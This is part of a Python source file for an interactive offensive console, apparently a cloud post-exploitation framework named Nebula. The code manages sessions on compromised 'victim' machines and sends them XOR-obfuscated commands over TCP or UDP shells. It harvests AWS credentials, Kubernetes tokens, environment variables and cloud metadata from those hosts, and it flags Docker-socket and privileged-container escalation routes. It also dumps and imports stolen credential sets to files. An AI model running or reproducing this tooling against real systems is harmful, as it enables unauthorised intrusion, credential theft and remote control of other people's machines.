                            check_env_file = "{}_check_env".format(dt_string)

                            with open("./workspaces/{}/{}/{}".format(workspace, particle, check_env_file), "w") as particle_file:
                                json.dump(check_env_dict, particle_file, indent=4, default=str)
                            particle_file.close()
                            print(check_env_dict)

                            print(
                                "{}".format(
                                    colored("Operating System Info: ", "yellow")
                                )
                            )

                            print(
                                "\t{}{}".format(
                                    colored("Operating System: ", "yellow"),
                                    colored(check_env_dict['SYSTEM'], "yellow")
                                )
                            )

                            uname = json.loads(check_env_dict['UNAME'])

                            print(
                                "\t{}{}".format(
                                    colored("Operating System Architecture: ", "yellow"),
                                    colored(uname['arch'], "blue")
                                )
                            )

                            print(
                                "\t{}{}".format(
                                    colored("Operating System Version: ", "yellow"),
                                    colored(uname['version'], "blue")
                                )
                            )

                            print(
                                "\t{}{}".format(
                                    colored("Operating System Kernel Release: ", "yellow"),
                                    colored(uname['release'], "blue")
                                )
                            )

                            # "UNAME": "\"release\": \"5.4.72-microsoft-standard-WSL2\", \"version\": \"#1 SMP Wed Oct 28 23:40:43 UTC 2020\", \"arch\": \"x86_64\"}

                            print(
                                "\t{}{}".format(
                                    colored("Hostname: ","yellow"),
                                    colored(check_env_dict['HOSTNAME'],"blue")
                                )
                            )

                            pat = re.compile(r"[a-z0-9]{12}")
                            if re.fullmatch(pat, check_env_dict['HOSTNAME']):
                                print(
                                    colored("[*] Hostname looks like it might be a container.","green")
                                )

                            print(
                                "{}{}".format(
                                    colored("Init System: ", "yellow"),
                                    colored(check_env_dict['INIT'], "yellow")
                                )
                            )

                            if not (check_env_dict['INIT']).strip() == 'init' and not (check_env_dict['INIT']).strip() == 'systemd':
                                print(
                                    colored("[*] Process no.1 isn't init or systemd, but '{}'. Might be a container.".format(check_env_dict['INIT']), "green")
                                )

                            if check_env_dict['DOCKSOCK']:
                                print(
                                        colored("[*] Docker Socket exists. If you are on a container, you can use it to Privilege Escalate.", "green")
                                )

                            if check_env_dict['PRIVILEGED']:
                                print(
                                        colored(
                                            "[*] Container appears to be run on Privileged Mode. Listing the host disks:",
                                            "green")
                                )
                                print(
                                        colored(
                                            "---------------------------------------------",
                                            "yellow")
                                )
                                if check_env_dict['DISKS']:
                                    for disk in check_env_dict['DISKS']:
                                        print(
                                                colored(
                                                    "\t{}".format(disk),
                                                    "yellow")
                                        )

                            if 'KUBETOKEN' in check_env_dict:
                                print(

                                        colored(
                                            "[*] Kube token exists. Value: {}".format(check_env_dict['KUBETOKEN']),
                                            "green")
                                    )


                            print(
                                colored("------------------------------------------------------------------------------","yellow")
                            )

                            print(
                                "{}{}".format(
                                    colored("User: ", "yellow"),
                                    colored(check_env_dict['USER'], "yellow")
                                )
                            )

                            if check_env_dict['USER'] == 'root':
                                print(colored("[*] User is root. If you are not in a container, consider urself lucky.", "green"))

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                            print(
                                "{}:".format(
                                    colored("Environment Variables", "yellow"),
                                )
                            )

                            for key,value in (check_env_dict['ENV']).items():
                                print(
                                    "\t{}: {}".format(
                                        colored(key,"red"),
                                        colored(value,"blue")
                                    )
                                )
                            check_env_var(check_env_dict['ENV'])

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                            print(
                                colored(
                                    "AWS Credentials:",
                                    "yellow")
                            )
                            if check_env_dict['AWS_CREDS']:
                                keys = []
                                print(
                                    colored(
                                        "\t--------------------------------",
                                        "yellow")
                                )
                                for creds in check_env_dict['AWS_CREDS']:
                                    awssess = {}
                                    if creds['profile'] == 'default':
                                        awssess['profile'] = "default_{}".format(particle)
                                        keys.append("default_{}".format(particle))
                                    else:
                                        awssess['profile'] = creds['profile']
                                        keys.append(creds['profile'])
                                    awssess['access_key_id'] = creds['AWS_KEY']
                                    awssess['secret_key'] = creds['SECRET_KEY']
                                    awssess['region'] = creds['region']
                                    all_sessions.append(awssess)

                                    print(
                                        colored(
                                            "\t{}".format(creds['profile']),
                                            "green")
                                    )
                                    for k,v in creds.items():
                                        print(
                                                "\t\t{}:{}".format(
                                                    colored(k, "red"),
                                                    colored(v, "blue")
                                                )
                                        )
                                    print(
                                        colored(
                                            "\t--------------------------------",
                                            "yellow")
                                    )

                                    #for awsprofile in (check_env_dict['AWS_CREDS']):

                                for ak in keys:
                                    print(colored("Profile '{}' saved on credentials".format(ak), "green"))

                                print("{} '{}' {}".format(
                                    colored('Use',"yellow"),
                                    colored('show credentails',"green"),
                                    colored('to check the new credentials',"yellow"),
                                ))
                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )
                            metadata = check_env_dict['META-DATA']
                            if metadata['status-code'] == 200 or metadata['status-code'] == 401:
                                global output
                                n_tab = 0

                                if isinstance(metadata, list):
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    output += colored("{}\n".format("META-DATA"), "yellow", attrs=['bold'])
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    for data in metadata:
                                        list_dictionary(data, n_tab)
                                        output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                elif isinstance(metadata, dict):
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    output += colored("{}\n".format("META-DATA"), "yellow", attrs=['bold'])
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                    list_dictionary(metadata, n_tab)
                                    output += colored("---------------------------------\n", "yellow", attrs=['bold'])
                                print(output)
                                output = ""

                            elif metadata['status-code'] == 404:
                                print(
                                    colored("[*] No access to Meta-Data. Sorry :'( ", "red")
                                )

                            else:
                                print(
                                    colored("[*] No access to Meta-Data. Sorry :'( ", "red")
                                )

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                            print(
                                colored(
                                    "Output saved to file '{}'".format(
                                        colored("./workspaces/{}/{}/{}".format(workspace, particle, check_env_file), "blue")
                                    ),
                                    "green")
                            )

                            print(
                                colored(
                                    "------------------------------------------------------------------------------",
                                    "yellow")
                            )

                        elif (command.split(" ")[1]).strip() == 'cd':
                            if (command.split(" ")[1:]) == "":
                                print(colored("Please enter a directory to go to."))
                            else:
                                cmd = ""
                                for c in (command.split(" ")[1:]):
                                    cmd += c + " "

                        else:
                            if "_tcp_" in particles[particle]['module']:
                                cmd = ""
                                for c in (command.split(" ")[1:]):
                                    cmd += c + " "
                                cmd += " "

                                cmd_command = str_xor(cmd, enc_key)
                                cmd_command += 'done'
                                shell.send(cmd_command.encode())

                                response = str_xor(recvall(shell).decode(), enc_key)
                                if response == "":
                                    print()

                                print(response)

                            if "_udp_" in particles[particle]['module']:
                                cmd = ""
                                addr = particles[particle]['IP']
                                port = particles[particle]['Port']

                                print(addr + ":" + str(port))

                                for c in (command.split(" ")[1:]):
                                    cmd += c + " "

                                shell.sendto(cmd.encode(), (addr, port))
                                resp = shell.recvfrom(20480)
                                print(resp[0])

                    except IOError as e:
                        print(
                            colored("[*] Connection closed by the victim machine!", "red")
                        )
                        del comms['use']['particle'][particle]
                        particles[particle]['socket'] = None
                        del particles[particle]
                        #del p[particle]
                        particle = ""
                        shell.close()
                    except:
                        #print("error")
                        #ty, val, tb = sys.exc_info()
                        #print(
                        #"Error: %s,%s,%s" % (
                        #    ty.__name__,
                        #    os.path.split(tb.tb_frame.f_code.co_filename)[1], tb.tb_next.tb_lineno
                        #))
                        #print("error")
                        e = sys.exc_info()
                        print(colored("[*] {}".format(e), "red"))

            elif command.split(" ")[0] == "options":
                if module_char == "":
                    print(colored("[*] Choose a module first.","red"))

                else:
                    print (colored("Desctiption:","yellow",attrs=["bold"]))
                    print (colored("-----------------------------","yellow",attrs=["bold"]))
                    print (colored("\t{}".format(imported_module.description),"green"))

                    print(colored("\nAuthor:", "yellow", attrs=["bold"]))
                    print(colored("-----------------------------", "yellow", attrs=["bold"]))
                    for x, y in imported_module.author.items():
                        print("\t{}: {}".format(colored(x, "red"), colored(y, "blue")))

                    print()
                    print("{}: {}".format(colored("Needs Credentials", "yellow", attrs=["bold"]),
                                          colored(imported_module.needs_creds, "green")))
                    print(colored("-----------------------------", "yellow", attrs=["bold"]))

                    print(colored("\nAWSCLI Command:", "yellow", attrs=["bold"]))
                    print(colored("---------------------"
                                  "--------", "yellow", attrs=["bold"]))
                    aws_comm = imported_module.aws_command
                    print("\t" + aws_comm)

                    print(colored("\nOptions:", "yellow", attrs=["bold"]))
                    print(colored("-----------------------------","yellow",attrs=["bold"]))
                    for key,value in imported_module.variables.items():
                        if (value['required']).lower() == "true":
                            print("\t{}:\t{}\n\t\t{}: {}\n\t\t{}: {}".format(colored(key,"red"),colored(value['value'],"blue"),colored("Required","yellow"), colored(value['required'],"green"), colored("Description","yellow"), colored(value['description'],"green")))

                        elif (value['required']).lower() == "false":
                            print("\t{}:\t{}\n\t\t{}: {}\n\t\t{}: {}".format(colored(key,"red"),colored(value['value'],"blue"),colored("Required","yellow"), colored(value['required'],"green"), colored("Description","yellow"), colored(value['description'],"green")))

                        else:
                            print("\t{}:\t{}".format(colored(key, "red"), colored(value['value'], "blue")))
                        print()

            elif command == 'insert':
                print(colored("Option 'insert' is used with another option. Use help for more.", "red"))

            elif command.split(" ")[0] == 'insert':
                if command.split(" ")[1] == 'credentials':
                    profile_name = ""
                    if len(command.split(" ")) == 2:
                        profile_name = input("Profile Name: ")
                    elif len(command.split(" ")) > 2:
                        print("Profile Name: {}".format(command.split(" ")[2]))
                        profile_name = command.split(" ")[2]

                    access_key_id = input("Access Key ID: ")
                    secret_key = input("Secret Key ID: ")
                    #region = input("Region: ")

                    sess_test['profile'] = str(profile_name)
                    sess_test['access_key_id'] = str(access_key_id)
                    sess_test['secret_key'] = str(secret_key)
                    sess_test['region'] = str("")
                    yon = input("\nDo you also have a session token?[y/N] ")
                    if yon == 'y' or yon == 'Y':
                        sess_token = input("Session Token: ")
                        sess_test['session_token'] = sess_token

                    comms['use']['credentials'][profile_name] = None

                    if sess_test['profile'] == "" and sess_test['access_key_id'] == "" and sess_test['secret_key'] == "" and sess_test['region'] == "":
                        pass

                    else:
                        cred_prof = sess_test['profile']
                        all_sessions.append(copy.deepcopy(sess_test))

                    print (colored("[*] Credentials set. Use ","green") + colored("'show credentials' ","blue") + colored("to check them.","green"))
                    print (colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))

            elif command == 'set':
                print(colored("Option 'set' is used with another option. Use help for more.","red"))

            elif command.split(" ")[0] == 'set':
                if command.split(" ")[1] == 'region':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Usage: 'set region <region-name>'", "red"))
                    else:
                        for sess in all_sessions:
                            if sess['profile'] == cred_prof:
                                sess['region'] = command.split(" ")[2]

                elif command.split(" ")[1] == 'aws-credentials':
                    if len(command.split(" ")) == 2:
                        print(colored("[*] The right command is: set aws-credentials <profile name>", "red"))
                    elif len(command.split(" ")) > 2:
                        print("Profile Name: {}".format(command.split(" ")[2]))
                        a = 0
                        for credentials in all_sessions:
                            if credentials['profile'] == command.split(" ")[2]:
                                print(colored("[*] Those credentials exist. Try a new Profile Name", "red"))
                                a = 1

                        del credentials

                        if a == 0:
                            access_key_id = input("Access Key ID: ")
                            secret_key = input("Secret Key ID: ")

                            sess_test['provider'] = 'AWS'
                            sess_test['profile'] = str(command.split(" ")[2])
                            sess_test['access_key_id'] = str(access_key_id)
                            sess_test['secret_key'] = str(secret_key)
                            sess_test['region'] = ""
                            yon = input("\nDo you also have a session token?[y/N] ")
                            if yon == 'y' or yon == 'Y':
                                sess_token = input("Session Token: ")
                                sess_test['session_token'] = sess_token

                            comms['use']['credentials'][command.split(" ")[2]] = None

                            if sess_test['profile'] == "" and sess_test['access_key_id'] == "" and sess_test['secret_key'] == "" and sess_test['region'] == "":
                                pass

                            else:
                                cred_prof = sess_test['profile']
                                #all_sessions.append(copy.deepcopy(sess_test))
                                all_sessions.append(sess_test)

                            print (colored("[*] Credentials set. Use ","green") + colored("'show credentials' ","blue") + colored("to check them.","green"))
                            print(colored("[*] Currect credential profile set to ", "green") + colored("'{}'.".format(cred_prof), "blue") + colored("Use ","green") + colored("'show current-creds' ","blue") + colored("to check them.","green"))

                elif command.split(" ")[1] == 'azure-credentials':
                    set_azure_credentials(command, comms)

                elif command.split(" ")[1] == 'user-agent':
                    if len(command.split(' ')) < 3 or len(command.split('"')) > 3:
                        print(colored("[*] Usage: set user-agent <linux | windows | custom>","red"))

                    elif len(command.split(' ')) == 3:
                        ua = command.split(' ')[2].lower()

                        if ua == "linux":
                            useragent = random.choice(user_agents_linux)
                        elif ua == "windows":
                            useragent = random.choice(user_agents_windows)
                        elif ua == "custom":
                            useragent = input("Enter the User-Agent you want: ")
                        else:
                            print(colored("[*] Usage: set user-agent <linux | windows | custom>", "red"))

                        print(colored("User Agent: {} was set".format(useragent),"green"))

                else:
                    if module_char == "":
                        print(colored("[*] Choose a module first.","red"))

                    elif len(command.split(" ")) < 3:
                        print (colored("[*] The right form is: set <OPTION> <VALUE>","red"))

                    elif (command.split(" ")[1]).upper() == 'SERVICE':
                        print(colored("[*] You can't change service.", "red"))

                    else:
                        count = 1
                        for key, value in imported_module.variables.items():
                            argument = ((command.split(" ")[1]).upper()).strip()
                            if key == argument:
                                count = 0
                                imported_module.variables[key]['value'] = command.split(" ")[2]
                                break

                        if count == 1:
                            print(colored("[*] That option does not exist on this module","red"))

            elif command.split(" ")[0] == 'unset':
                if (command.split(" ")[1]).lower() == 'user-agent':
                    useragent = ""
                    print(colored("[*] User Agent set to empty.", "green"))

                elif (command.split(" ")[1]).lower() == 'particle':
                    shell = None
                    particle = ""

                elif (command.split(" ")[1]).lower() == 'credentials':
                    print(colored(
                        "[*] Credentials unset. Now you have no current-credentials choosen.", "green"
                    ))
                    cred_prof = ""

                else:
                    if module_char == "":
                        print(colored("[*] Choose a module first.","red"))

                    elif len(command.split(" ")) > 2:
                        print (colored("[*] The right form is: unset <OPTION>","red"))

                    elif (command.split(" ")[1]).upper() == 'SERVICE':
                        print(colored("[*] You can't change service.", "red"))

                    else:
                        count = 1
                        for key, value in imported_module.variables.items():
                            argument = ((command.split(" ")[1]).upper()).strip()
                            if key == argument:
                                count = 0
                                imported_module.variables[key]['value'] = ""
                                break

                        if count == 1:
                            print(colored("[*] That option does not exist on this module","red"))

            elif command.split(" ")[0] == 'show':
                if command.split(" ")[1] == 'credentials':
                    for sess in all_sessions:
                        print(colored("-------------------------------------",
                                      "yellow"))
                        print("{}: {}".format(
                            colored("Profile", "yellow"),
                            colored(sess['profile'], "yellow")
                        ))
                        print(colored("-------------------------------------",
                                      "yellow"))
                        for key, value in sess.items():
                            print("\t{}: {}".format(
                                colored(key, "red"),
                                colored(value, "blue")
                            ))
                        print()

                    del key
                    del value


                elif command.split(" ")[1] == 'sockets':
                    if not sockets:
                        print(colored("[*] No socket is available","yellow", attrs=['bold']))
                    else:
                        print(colored("----------------------------------------------------------------------",
                                      "yellow"))
                        for key,value in sockets.items():
                            if value['socket'] == None:
                                continue
                            elif key == 'ENKEY':
                                continue
                            else:
                                if value['type'] == "SOCK_STREAM":
                                    type = "TCP"
                                elif value['type'] == "SOCK_DGRAM":
                                    type = "UDP"
                                else:
                                    type = value['type']
                                print("Socket {}: type: {} | protocol: {} | module: {}".format(
                                    colored(key, "blue"),
                                    colored(value['addr'], "blue"),
                                    colored(type, "blue"),
                                    colored(value['module'], "blue")
                                ))
                        print(colored("----------------------------------------------------------------------",
                                      "yellow"))
                elif command.split(" ")[1] == 'particles':
                    if not particles:
                        print(colored("[*] You have no current sessions!\n", "yellow"))
                    else:
                        print(colored("--------------------------------------------------------------------------------------------", "yellow"))
                        for name,part in particles.items():
                                print("Session {} | {} | {} | {} | {} | {} | {} | {}".format(
                                    colored(name, "red"),
                                    colored(part['IP'], "yellow"),
                                    colored(part['Hostname'], "yellow"),
                                    colored(part['LAN_IP'], "green"),
                                    colored(part['Port'], "magenta"),
                                    colored(part['OS'], "cyan"),
                                    colored(part['User'], "yellow"),
                                    colored(part['module'], "blue")
                                ))

                        print(colored("--------------------------------------------------------------------------------------------", "yellow"))

                elif command.split(" ")[1] == "workspaces":
                    print(colored("-----------------------------------", "yellow"))
                    print("{}:".format(colored("Workspaces", "yellow")))
                    print(colored("-----------------------------------", "yellow"))
                    for w in workspaces:
                        print("\t{}".format(w))
                    print()

                elif (command.split(" ")[1]).lower() == 'user-agent':
                    if useragent == "":
                        print("{}".format(colored("[*] User Agent is empty.", "green")))
                    else:
                        print("{}: {}".format(colored("[*] User Agent is", "green"), colored(useragent, "yellow")))

                elif command.split(" ")[1] == 'current-creds':
                    if cred_prof == "":
                        print(colored(
                            "[*] You have no credentials choosen. Either set some or use some.", "yellow"
                        ))

                    for sess in all_sessions:
                        if sess['profile'] == cred_prof:
                            print(colored("--------------------------------------------------------------------------", "yellow"))
                            print("{}: {}".format(
                                colored("Profile", "red"),
                                colored(cred_prof, "blue")
                            ))
                            print(colored("--------------------------------------------------------------------------", "yellow"))
                            for key, value in sess.items():
                                print("\t{}: {}".format(
                                    colored(key, "red"),
                                    colored(value, "blue")
                                ))
                            print(colored("--------------------------------------------------------------------------", "yellow"))

                elif command.split(" ")[1] == 'modules':
                    for module in show:
                        arr = os.listdir("./module/" + module)
                        for x in arr:
                            if "__" in x:
                                continue
                            elif ".git" in x:
                                continue
                            else:
                                List = []
                                list2 = []
                                indention = 80
                                max_line_length = 60

                                mod = module + "/" + x.split(".py")[0]
                                thedir = mod.split("/")[0]
                                sys.path.insert(0, "./module/" + thedir)
                                imported_module = __import__(mod.split("/")[1])
                                list2.append("\t{}".format(colored(mod, "blue")))
                                list2.append("\t{}".format(colored(imported_module.description, "yellow")))
                                List.append(list2)

                                for i in range(len(List)):
                                    out = List[i][0].ljust(indention, ' ')
                                    cur_indent = 0
                                    for line in List[i][1].split('\n'):
                                        for short_line in textwrap.wrap(line, max_line_length):
                                            out += ' ' * cur_indent + short_line.lstrip() + "\n"
                                            cur_indent = indention
                                        print(out)

                                List = []
                                list2 = []


                elif command.split(" ")[1] in show:
                    terminal = colored(command.split(" ")[1],"blue")
                    arr = os.listdir("./module/" + command.split(" ")[1])
                    for x in arr:
                        if "__" in x:
                            continue
                        elif ".git" in x:
                            continue
                        else:
                            List = []
                            list2 = []
                            indention = 80
                            max_line_length = 60

                            mod = command.split(" ")[1] + "/" + x.split(".py")[0]
                            thedir = mod.split("/")[0]
                            if "\\" in thedir:
                                thedir = thedir.replace("\\","/")
                            sys.path.insert(0, "./module/" + thedir)
                            imported_module = __import__(mod.split("/")[1])
                            list2.append("\t{}".format(colored(mod, "blue")))
                            list2.append("\t{}".format(colored(imported_module.description, "yellow")))
                            List.append(list2)

                            for i in range(len(List)):
                                out = List[i][0].ljust(indention, ' ')
                                cur_indent = 0
                                for line in List[i][1].split('\n'):
                                    for short_line in textwrap.wrap(line, max_line_length):
                                        out += ' ' * cur_indent + short_line.lstrip() + "\n"
                                        cur_indent = indention
                                    print(out)
                            List = []
                            list2 = []
                            out = ""
                else:
                    print (colored("[*] '{}' is not a valid command".format(command.split(" ")[1]), "red"))

            elif command.split(" ")[0] == 'dump':
                if len(command.split(" ")) < 2:
                    print(colored("[*] Correct command is 'dump credentials'", "red"))

                if command.split(" ")[1] == 'credentials':
                    if not all_sessions:
                        print(colored("[*] You have no credentials at the moment. Pease add some first, then save them latter.", "red"))
                    else:
                        now = datetime.now()
                        dt_string = now.strftime("%d_%m_%Y_%H_%M_%S")
                        if not os.path.exists('./credentials'):
                            os.makedir('./credentials')

                        with open("./credentials/{}".format(dt_string), 'w') as outfile:
                            json.dump(all_sessions, outfile)
                            print(colored("[*] Credentials dumped on file '{}'.".format("./credentials/{}".format(dt_string)), "green"))
                else:
                    print(colored("[*] Correct command is 'dump credentials'", "red"))

            elif command.split(" ")[0] == 'import':
                if command.split(" ")[1] == 'credentials':
                    if len(command.split(" ")) < 3:
                        print(colored("[*] Usage: import credentials <cred name>","red"))
                    else:
                        if command.split(" ")[2] == "":
                            print(colored("[*] Usage: import credentials <cred name>", "red"))
                        elif "/" in command.split(" ")[2] or "\\" in command.split(" ")[2]:
                            print(colored("[*] Just enter the credential file name, not the whole path. That being said, no \\ or / should be on the file name.","red"))
                        else:
                            with open("./credentials/{}".format(command.split(" ")[2]), 'r') as outfile:
                                sessions = json.load(outfile)
                                for s in sessions:
                                    name = s['profile']
                                    for credentials in all_sessions:
                                        if credentials['profile'] == name:
                                            cred_letters = string.ascii_lowercase
                                            w = ''.join(random.choice(cred_letters) for i in range(8))
                                            name += w
                                            credentials['profile'] = name
                                            print(colored("[*] Those credentials exist. Renaming to {}".format(name),
                                                          "yellow"))
                                    comms['use']['credentials'][name] = None
                                    all_sessions.append(s)

                else:
                    print(
                        colored("[*] Correct command is 'import credentials'.", "red")
                    )

            elif command == 'getuid':
                ready = False
                if cred_prof == "":
                    print(
                        colored("[*] Please choose a set of credentials first using 'use credentials <name>'.", "red"))
                else:
                    ready = True

                if workspace == "":
                    print(
                        colored("[*] Please choose a workspace first using 'use workspace <name>'.", "red"))
                    ready = False

                if ready:
                    for sess in all_sessions:
                        if sess['profile'] == cred_prof:
                            getuid(sess, workspace)

            else:
                try:
                    if system == 'Windows':
                        command = "powershell.exe " + command
                        out = os.popen(command).read()
                        print(out)
                    elif system == 'Linux' or system == 'Darwin':
                        out = os.popen(command).read()
                        print(out)
                except:
                    print (colored("[*] '{}' is not a valid command.".format(command), "red"))

            com = "({})({})({}) >>> ".format(colored(workspace,"green"),colored(particle,"red"), terminal)

            history_file = FileHistory(".nebula-history-file")
            session = PromptSession(history=history_file)
            for x in workspaces:
                comms['remove']['workspace'][x] = None
            completer = NestedCompleter.from_nested_dict(comms)
            command = session.prompt(
                ANSI(
                    com
                ),
                completer=completer,
                complete_style=CompleteStyle.READLINE_LIKE
            )
            command.strip()
    except KeyboardInterrupt:
        command = input(
            colored("Are you sure you want to exit? [y/N] ", "red")
        )
        if command == "Y" or command == "y":
            if sockets:
                for key,value in sockets.items():
                    s = value['socket']
                    s.shutdown(2)
                    s.close()

                print("All socket closed!")
            exit()
            sys.exit()

        main(workspace, particle, module_char, p, sockets)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-b", action='store_true', help="Do not print banner")
    parser.add_argument("-g", action='store_true', help="Start the GUI Interface")
    args = parser.parse_args()

    if args.b:
        print(colored("-------------------------------------------------------------", "green"))
        core.banner.banner.module_count_without_banner()
        print(colored("-------------------------------------------------------------\n", "green"))

    else:
        core.banner.banner.banner()

    p = {}
    main(workspace, particle, terminal, p, sockets)